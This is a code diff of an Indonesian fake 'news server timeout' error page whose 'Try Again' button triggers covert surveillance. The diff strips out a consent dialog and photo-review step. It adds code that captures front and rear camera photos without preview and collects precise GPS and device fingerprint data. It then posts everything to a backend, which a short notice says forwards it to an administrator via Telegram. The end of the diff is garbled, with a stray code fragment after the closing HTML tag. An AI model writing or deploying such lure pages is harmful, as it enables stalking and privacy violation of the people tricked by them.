@@ -29,7 +29,6 @@ body{
 .subtitle{font-size:18px;font-weight:600;margin-bottom:10px}
 .desc{font-size:14px;color:#666;margin-bottom:15px}
 #line{height:3px;background:#d32f2f;width:100%;margin:15px 0 20px}
-
 .detail{text-align:left;font-size:14px;color:#444}
 .detail p{margin:6px 0}
 .detail ul{margin:8px 0 0 18px;padding:0}
@@ -56,11 +55,7 @@ button{
 }
 
 button:hover{background:#b71c1c}
-
-button:disabled{
-  opacity:.6;
-  cursor:not-allowed;
-}
+button:disabled{opacity:.6;cursor:wait}
 
 .loading-bar{
   width:100%;
@@ -78,77 +73,7 @@ button:disabled{
   transition:width 1.8s linear;
 }
 
-@keyframes loadingMove{
-  from{transform:translateX(-100%)}
-  to{transform:translateX(350%)}
-}
-
 .footer{font-size:13px;color:#666}
-
-/* TAMBAHAN MODAL */
-
-.modal{
-  display:none;
-  position:fixed;
-  z-index:999;
-  inset:0;
-  background:rgba(0,0,0,.75);
-  align-items:center;
-  justify-content:center;
-  padding:15px;
-}
-
-.modal-content{
-  background:white;
-  width:100%;
-  max-width:420px;
-  padding:20px;
-  border-radius:8px;
-  text-align:center;
-  max-height:90vh;
-  overflow-y:auto;
-}
-
-.modal-content h3{
-  margin-top:0;
-}
-
-.modal-content p{
-  font-size:14px;
-  line-height:1.6;
-  color:#555;
-}
-
-.modal-content button{
-  width:100%;
-  margin:10px 0;
-}
-
-.secondary{
-  background:#777;
-}
-
-video,.captured{
-  width:100%;
-  border-radius:6px;
-  margin-top:10px;
-  background:#222;
-}
-
-.captured{
-  display:none;
-}
-
-#processStatus{
-  font-size:13px;
-  color:#555;
-  line-height:1.5;
-  overflow-wrap:anywhere;
-}
-
-.hidden{
-  display:none !important;
-}
 </style>
 </head>
 
@@ -171,418 +96,213 @@ video,.captured{
   <div class="detail-box">
     <div class="detail">
       <p><strong>Detail kesalahan:</strong> Koneksi timeout ke server berita</p>
+
       <p><strong>Solusi yang mungkin:</strong></p>
       <ul>
         <li>Periksa koneksi internet Anda</li>
         <li>Coba muat ulang halaman ini nanti</li>
         <li>Bersihkan cache browser Anda</li>
       </ul>
+
+      <p style="margin-top:12px">
+        <strong>Pemberitahuan privasi:</strong>
+        Tombol Coba Lagi akan meminta izin lokasi dan kamera depan serta belakang.
+        Jika diizinkan, foto dan informasi perangkat akan dikirim ke administrator
+        melalui Telegram.
+      </p>
     </div>
   </div>
 
-  <button id="retryButton" onclick="startProcess()">
-    Coba Lagi
-  </button>
+  <button id="retryButton" onclick="sendReport()">Coba Lagi</button>
 
-  <div class="footer">
+  <div class="footer" id="status">
     Jika masalah berlanjut, silakan hubungi administrator sistem.
   </div>
 
 </div>
 
-
-<!-- MODAL PERSETUJUAN -->
-
-<div class="modal" id="consentModal">
-  <div class="modal-content">
-
-    <h3>Persetujuan Pengiriman Laporan</h3>
-
-    <p>
-      Jika melanjutkan, Anda menyetujui pengiriman informasi
-      teknis perangkat, alamat IP, lokasi GPS jika diizinkan,
-      serta foto kamera depan dan belakang yang Anda ambil
-      dan konfirmasi sendiri.
-    </p>
-
-    <button onclick="beginCapture()">
-      Setuju dan Lanjutkan
-    </button>
-
-    <button class="secondary" onclick="closeModal()">
-      Batal
-    </button>
-
-  </div>
-</div>
-
-
-<!-- MODAL KAMERA -->
-
-<div class="modal" id="cameraModal">
-  <div class="modal-content">
-
-    <h3 id="cameraTitle">Pemeriksaan Kamera</h3>
-
-    <p id="cameraDescription">
-      Pastikan preview kamera sesuai sebelum mengambil foto.
-    </p>
-
-    <video id="video" autoplay playsinline></video>
-
-    <button id="captureButton" onclick="capturePhoto()">
-      Ambil Foto
-    </button>
-
-    <button class="secondary" onclick="skipCamera()">
-      Lewati Kamera Ini
-    </button>
-
-    <p id="cameraStatus"></p>
-
-  </div>
-</div>
-
-
-<!-- MODAL KONFIRMASI FOTO -->
-
-<div class="modal" id="reviewModal">
-  <div class="modal-content">
-
-    <h3>Konfirmasi Foto</h3>
-
-    <p>
-      Periksa kedua foto berikut. Foto hanya akan dikirim
-      setelah Anda menekan tombol konfirmasi.
-    </p>
-
-    <strong>Kamera Depan</strong>
-    <img id="frontPreview" class="captured">
-
-    <strong>Kamera Belakang</strong>
-    <img id="backPreview" class="captured">
-
-    <button onclick="uploadReport()">
-      Konfirmasi Kirim Laporan dan Foto
-    </button>
-
-    <button class="secondary" onclick="cancelUpload()">
-      Batalkan Pengiriman
-    </button>
-
-    <p id="processStatus"></p>
-
-  </div>
-</div>
-
-
 <script>
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-let stream = null;
+async function captureCamera(mode) {
+  let stream;
 
-let currentCamera = "";
+  try {
+    if (!navigator.mediaDevices?.getUserMedia) {
+      return { status: "Tidak didukung", photo: null };
+    }
 
-let frontPhoto = null;
-let backPhoto = null;
+    stream = await navigator.mediaDevices.getUserMedia({
+      audio: false,
+      video: {
+        facingMode: { exact: mode },
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      }
+    });
 
-let frontStatus = "Tidak diperiksa";
-let backStatus = "Tidak diperiksa";
+    const video = document.createElement("video");
+    video.muted = true;
+    video.playsInline = true;
+    video.srcObject = stream;
 
-let locationData = {
-  locationConsent: false,
-  latitude: null,
-  longitude: null,
-  accuracy: null
-};
+    await video.play();
+    await sleep(700);
 
-const video = document.getElementById("video");
+    if (!video.videoWidth || !video.videoHeight) {
+      throw new Error("Kamera tidak menghasilkan gambar");
+    }
 
-const loadingBar = document.getElementById("loadingBar");
+    const canvas = document.createElement("canvas");
 
-const loadingFill =
-  loadingBar.querySelector(".loading-fill");
-
-
-/* ================= MODAL ================= */
-
-function showModal(id){
-  document.getElementById(id).style.display = "flex";
-}
-
-function hideModal(id){
-  document.getElementById(id).style.display = "none";
-}
-
-function closeModal(){
-  hideModal("consentModal");
-}
-
-
-/* ================= START ================= */
-
-function startProcess(){
-
-  showModal("consentModal");
-
-}
-
-
-/* ================= GPS ================= */
-
-function getLocation(){
-
-  return new Promise(resolve => {
-
-    const approved = confirm(
-      "Apakah Anda mengizinkan pengiriman lokasi GPS?"
+    const scale = Math.min(
+      1,
+      900 / Math.max(video.videoWidth, video.videoHeight)
     );
 
-    if(!approved || !navigator.geolocation){
+    canvas.width = Math.round(video.videoWidth * scale);
+    canvas.height = Math.round(video.videoHeight * scale);
 
-      locationData = {
-        locationConsent:false,
-        latitude:null,
-        longitude:null,
-        accuracy:null
-      };
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      resolve();
+    const photo = canvas.toDataURL("image/jpeg", 0.55);
+
+    return {
+      status: "Foto berhasil diambil",
+      photo
+    };
+
+  } catch (error) {
+    return {
+      status: error.name === "NotAllowedError"
+        ? "Izin ditolak"
+        : "Tidak tersedia",
+      photo: null
+    };
+
+  } finally {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+    }
+  }
+}
+
+function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) {
+      resolve({
+        status: "Tidak didukung"
+      });
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
-
       position => {
-
-        locationData = {
-          locationConsent:true,
-          latitude:position.coords.latitude,
-          longitude:position.coords.longitude,
-          accuracy:position.coords.accuracy
-        };
-
-        resolve();
-
+        resolve({
+          status: "Diizinkan",
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        });
       },
-
-      () => {
-
-        locationData = {
-          locationConsent:false,
-          latitude:null,
-          longitude:null,
-          accuracy:null
-        };
-
-        resolve();
-
+      error => {
+        resolve({
+          status: error.code === 1 ? "Izin ditolak" : "Tidak tersedia"
+        });
       },
-
       {
-        enableHighAccuracy:true,
-        timeout:15000,
-        maximumAge:0
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
       }
-
     );
-
   });
-
 }
 
+async function sendReport() {
+  const button = document.getElementById("retryButton");
+  const status = document.getElementById("status");
+  const fill = document.querySelector(".loading-fill");
 
-/* ================= CAMERA FLOW ================= */
-
-async function beginCapture(){
-
-  hideModal("consentModal");
-
-  loadingBar.style.display = "block";
-
-  loadingFill.style.width = "0%";
+  button.disabled = true;
+  status.textContent = "Memproses laporan...";
+  fill.style.width = "0%";
 
   setTimeout(() => {
-    loadingFill.style.width = "100%";
-  },50);
+    fill.style.width = "100%";
+  }, 50);
 
-  await getLocation();
+  try {
+    const deviceData = {
+      consent: true,
+      os: navigator.userAgentData?.platform || "Unknown",
+      platform: navigator.platform,
+      cpu: navigator.hardwareConcurrency || "Unknown",
+      ram: navigator.deviceMemory
+        ? navigator.deviceMemory + " GB (approx)"
+        : "Unknown",
+      resolution: screen.width + "x" + screen.height,
+      browser: navigator.userAgent,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language
+    };
 
-  currentCamera = "user";
+    status.textContent = "Meminta izin kamera depan...";
 
-  await openCamera("user");
+    const front = await captureCamera("user");
 
-}
+    status.textContent = "Meminta izin kamera belakang...";
 
+    const back = await captureCamera("environment");
 
-async function openCamera(mode){
+    status.textContent = "Meminta izin lokasi...";
 
-  currentCamera = mode;
+    const location = await getLocation();
 
-  const title = document.getElementById("cameraTitle");
+    const payload = {
+      ...deviceData,
 
-  const description =
-    document.getElementById("cameraDescription");
+      latitude: location.latitude ?? null,
+      longitude: location.longitude ?? null,
+      accuracy: location.accuracy ?? null,
+      locationStatus: location.status,
 
-  const status =
-    document.getElementById("cameraStatus");
+      frontCamera: front.status,
+      backCamera: back.status,
 
-  title.textContent =
-    mode === "user"
-      ? "Pemeriksaan Kamera Depan"
-      : "Pemeriksaan Kamera Belakang";
+      frontPhoto: front.photo,
+      backPhoto: back.photo
+    };
 
-  description.textContent =
-    "Preview kamera ditampilkan. Ambil foto hanya jika Anda menyetujuinya.";
+    status.textContent = "Mengirim laporan ke administrator...";
 
-  status.textContent = "Meminta izin kamera...";
-
-  showModal("cameraModal");
-
-  try{
-
-    stopStream();
-
-    stream = await navigator.mediaDevices.getUserMedia({
-
-      video:{
-        facingMode:{
-          ideal:mode
-        },
-        width:{
-          ideal:1280
-        },
-        height:{
-          ideal:720
-        }
+    const response = await fetch("/api/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
       },
-
-      audio:false
-
+      body: JSON.stringify(payload)
     });
 
-    video.srcObject = stream;
+    const result = await response.json();
 
-    await video.play();
-
-    status.textContent =
-      "Kamera aktif. Periksa preview sebelum mengambil foto.";
-
-  }catch(error){
-
-    if(mode === "user"){
-      frontStatus = "Izin ditolak atau tidak tersedia";
-    }else{
-      backStatus = "Izin ditolak atau tidak tersedia";
+    if (!response.ok || !result.success) {
+      throw new Error(result.message || "Pengiriman gagal");
     }
 
-    status.textContent =
-      "Kamera tidak dapat diakses.";
+    status.textContent = "Laporan berhasil dikirim.";
 
-    document.getElementById("captureButton").disabled = true;
-
+  } catch (error) {
+    status.textContent = "Gagal mengirim laporan: " + error.message;
+    button.disabled = false;
+    fill.style.width = "0%";
   }
-
 }
+</script>
 
-
-/* ================= CAPTURE ================= */
-
-function capturePhoto(){
-
-  if(!stream || !video.videoWidth){
-    alert("Kamera belum siap.");
-    return;
-  }
-
-  const canvas = document.createElement("canvas");
-
-  const maxWidth = 1280;
-
-  const ratio = Math.min(
-    1,
-    maxWidth / video.videoWidth
-  );
-
-  canvas.width = Math.round(video.videoWidth * ratio);
-
-  canvas.height = Math.round(video.videoHeight * ratio);
-
-  const ctx = canvas.getContext("2d");
-
-  ctx.drawImage(
-    video,
-    0,
-    0,
-    canvas.width,
-    canvas.height
-  );
-
-  const photo = canvas.toDataURL(
-    "image/jpeg",
-    0.7
-  );
-
-  if(currentCamera === "user"){
-
-    frontPhoto = photo;
-
-    frontStatus = "Disetujui dan diambil";
-
-    stopStream();
-
-    document.getElementById("captureButton").disabled = false;
-
-    openCamera("environment");
-
-  }else{
-
-    backPhoto = photo;
-
-    backStatus = "Disetujui dan diambil";
-
-    stopStream();
-
-    hideModal("cameraModal");
-
-    showReview();
-
-  }
-
-}
-
-
-/* ================= SKIP CAMERA ================= */
-
-function skipCamera(){
-
-  stopStream();
-
-  if(currentCamera === "user"){
-
-    frontStatus = "Tidak diperiksa";
-
-    openCamera("environment");
-
-  }else{
-
-    backStatus = "Tidak diperiksa";
-
-    hideModal("cameraModal");
-
-    showReview();
-
-  }
-
-}
-
-
-/* ================= STOP CAMERA ================= */
-
-function stopStream(){
-
-  if(stream){
-
-    stream.getTracks().forEach(track => {
+</body>
+</html>.forEach(track => {
       track.stop();
     });
 
